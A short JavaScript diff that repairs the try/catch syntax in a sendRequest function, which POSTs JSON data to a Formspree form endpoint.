@@ -12,12 +12,13 @@ async function getLocation() {
 }
 
 async function sendRequest(data) {
-  try:
+  try {
     const response = await fetch("https://formspree.io/f/xeorknrp", {
       method: "POST",
       headers: { "Content-Type": "text/plain" },
       body: JSON.stringify(data),
     });
+  }
   catch (err) {
   }
 }
